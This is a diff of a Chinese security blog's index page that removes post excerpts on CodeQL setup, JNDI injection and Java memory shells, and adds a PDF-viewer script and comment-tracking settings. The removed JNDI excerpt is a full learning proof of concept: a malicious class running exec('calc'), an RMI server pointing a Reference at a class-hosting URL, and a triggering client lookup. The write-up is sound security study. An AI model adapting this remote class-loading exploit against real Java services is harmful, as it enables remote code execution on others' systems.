class="name">maven.compiler.compilerVersion</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>但是还是报错了,最后去环境变量里面把JAVA_HOME改成1.7的就行了(到这里终于目标为啥配环境变量的时候非得搞个叫JAVA_HOME的,而不是直接往path里面添加,改起来是真滴快啊)</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/3ec4b8d3b4b6e92bacb55f064798a99f.png" alt="image-20220512155048464"></p>
-<h4 id="成功"><a href="#成功" class="headerlink" title="成功"></a>成功</h4><p>最后再次打开命令行输入</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create D:\TOOLS\codeql\database\commons-collection3.2 --language=<span class="string">&quot;java&quot;</span> --<span class="built_in">command</span>=<span class="string">&quot;mvn clean install --file pom.xml&quot;</span> --source-root=D:\TOOLS\codeql\soutce-project\commons-collections --overwrite </span><br></pre></td></tr></table></figure>
-
-<p>成功构建cc3的数据库</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/25f2a1ac18122cb378b43056fe34a42f.png" alt="image-20220512155241642"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/06/codeql%E5%AE%89%E8%A3%85/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
-      <meta itemprop="name" content="blueSatchel">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="blueSatchel's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/05/06/codeql%E5%AE%89%E8%A3%85/" class="post-title-link" itemprop="url">codeql安装</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-05-06 12:14:36 / 修改时间：13:04:32" itemprop="dateCreated datePublished" datetime="2022-05-06T12:14:36+08:00">2022-05-06</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/codeql/" itemprop="url" rel="index"><span itemprop="name">codeql</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2022/05/06/codeql%E5%AE%89%E8%A3%85/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/06/codeql%E5%AE%89%E8%A3%85/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>本文章为多次尝试之后,自己成功安装并运行成功codeql的记录,没啥技术含量…
+<h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2022/05/06/codeql%E5%AE%89%E8%A3%85/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/04/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
-      <meta itemprop="name" content="blueSatchel">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="blueSatchel's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/05/04/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">jndi注入学习</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-05-04 20:43:07" itemprop="dateCreated datePublished" datetime="2022-05-04T20:43:07+08:00">2022-05-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-05-05 15:55:11" itemprop="dateModified" datetime="2022-05-05T15:55:11+08:00">2022-05-05</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2022/05/04/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/04/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="JNDI简介"><a href="#JNDI简介" class="headerlink" title="JNDI简介"></a>JNDI简介</h3><p>JNDI（The Java Naming and Directory Interface，Java命名和目录接口）是一组在Java应用中访问命名和目录服务的API,命名服务将名称和对象联系起来,使得我们可以用名称访问对象。</p>
-<p>常见的命名/目录提供者</p>
-<ul>
-<li>RMI</li>
-<li>LDAP</li>
-<li>CORBA</li>
-<li>DNS</li>
-</ul>
-<p>一个简单的例子开始JNDI的学习</p>
-<p>首先编写并编译恶意class文件放到可访问的URL上,接着将其URL注册并绑定给该服务器某端口的RMI服务商</p>
-<blockquote>
-<p>这里有个问题,为什么不直接使用RMI来加载恶意类呢</p>
-</blockquote>
-<p>因为RMI它的特点是调用完结果是由RMI服务器去执行的,执行完的结果以序列化的形式传递给客户端,虽然可能存在反序列化的利用,但是不符合这里想要构造的远程加载恶意class文件并在客户端上面执行的思路</p>
-<p>恶意类</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>server.java</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//第一个参数随便填</span></span><br><span class="line">        Reference reference=<span class="keyword">new</span> Reference(<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:5555/&quot;</span>);</span><br><span class="line">        <span class="comment">//这里末尾要加个/,否则无法读取.....</span></span><br><span class="line">        <span class="comment">//将该reference封装成远程对象</span></span><br><span class="line">        ReferenceWrapper referenceWrapper=<span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;hello&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>client.java</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url=<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>;</span><br><span class="line">        Context ctx=<span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>最后本质上是通过URLClassLoader去远程加载了恶意类</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/25/javaAgent%E5%86%85%E5%AD%98%E9%A9%AC/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
-      <meta itemprop="name" content="blueSatchel">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="blueSatchel's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/25/javaAgent%E5%86%85%E5%AD%98%E9%A9%AC/" class="post-title-link" itemprop="url">javaAgent内存马</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-04-25 13:29:13" itemprop="dateCreated datePublished" datetime="2022-04-25T13:29:13+08:00">2022-04-25</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-29 11:08:04" itemprop="dateModified" datetime="2022-04-29T11:08:04+08:00">2022-04-29</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2022/04/25/javaAgent%E5%86%85%E5%AD%98%E9%A9%AC/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2022/04/25/javaAgent%E5%86%85%E5%AD%98%E9%A9%AC/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>记录一下javaAgent的学习</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/04/25/javaAgent%E5%86%85%E5%AD%98%E9%A9%AC/">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/23/%E5%86%85%E5%AD%98%E9%A9%AC%E9%98%B2killed/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
-      <meta itemprop="name" content="blueSatchel">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="blueSatchel's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/23/%E5%86%85%E5%AD%98%E9%A9%AC%E9%98%B2killed/" class="post-title-link" itemprop="url">内存马防killed</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-04-23 23:43:35" itemprop="dateCreated datePublished" datetime="2022-04-23T23:43:35+08:00">2022-04-23</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-25 11:55:13" itemprop="dateModified" datetime="2022-04-25T11:55:13+08:00">2022-04-25</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2022/04/23/%E5%86%85%E5%AD%98%E9%A9%AC%E9%98%B2killed/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2022/04/23/%E5%86%85%E5%AD%98%E9%A9%AC%E9%98%B2killed/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>servlet和filter类型的内存马如何防止被删除呢
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/04/23/%E5%86%85%E5%AD%98%E9%A9%AC%E9%98%B2killed/#more" rel="contents">
+              <a class="btn" href="/2022/05/12/%E4%BD%BF%E7%94%A8codeql%E7%9A%84cc%E9%93%BE%E5%88%86%E6%9E%90/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -1277,7 +1217,7 @@
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <img class="site-author-image" itemprop="image" alt="blueSatchel"
-      src="/../images/avatar.PNG">
+      src="/../images/luoqixi.png">
   <p class="site-author-name" itemprop="name">blueSatchel</p>
   <div class="site-description" itemprop="description"></div>
 </div>
@@ -1286,7 +1226,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-count">78</span>
           <span class="site-state-item-name">文章</span>
         </a>
       </div>
@@ -1313,6 +1253,10 @@
 
 
       </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
 
     </div>
   </aside>
@@ -1371,6 +1315,8 @@
 
 <script src="/js/next-boot.js"></script>
 
+<script src="/js/bookmark.js"></script>
+
 
 
 
@@ -1390,6 +1336,26 @@
 
 
 
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
 
 
 
@@ -1417,10 +1383,10 @@ NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
       avatar     : 'mm',
       meta       : guest,
       pageSize   : '10' || 10,
-      visitor    : false,
+      visitor    : true,
       lang       : '' || 'zh-cn',
       path       : location.pathname,
-      recordIP   : false,
+      recordIP   : true,
       serverURLs : ''
     });
   }, window.Valine);
